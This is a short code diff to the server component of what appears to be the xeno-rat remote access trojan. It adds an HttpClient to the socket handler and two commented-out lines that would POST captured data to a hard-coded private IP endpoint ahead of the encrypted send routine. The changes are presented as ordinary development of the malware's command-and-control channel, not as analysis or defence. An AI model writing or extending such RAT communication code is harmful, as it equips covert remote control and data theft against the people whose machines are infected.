@@ -5,6 +5,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Net.Http;
 
 namespace xeno_rat_server
 {
@@ -17,6 +18,7 @@ namespace xeno_rat_server
     public partial class SocketHandler
     {
         public Socket sock;
+        public HttpClient httpClient;
         public byte[] EncryptionKey;
         public int socktimeout = 0;
         private bool doProtocolUpgrade = false;
@@ -25,6 +27,7 @@ namespace xeno_rat_server
             sock = socket;
             sock.NoDelay = true;
             EncryptionKey =_EncryptionKey;
+
         }
 
 
@@ -154,6 +157,9 @@ namespace xeno_rat_server
                 }
                 else 
                 {
+                    //var requestUrl = "https://172.23.192.1:8080/api/endpoint";
+
+                    //return await httpClient.PostAsync(requestUrl, new ByteArrayContent(data));
 
                     data = Encryption.Encrypt(data, EncryptionKey);
                     byte[] compressedData = Compression.Compress(data);
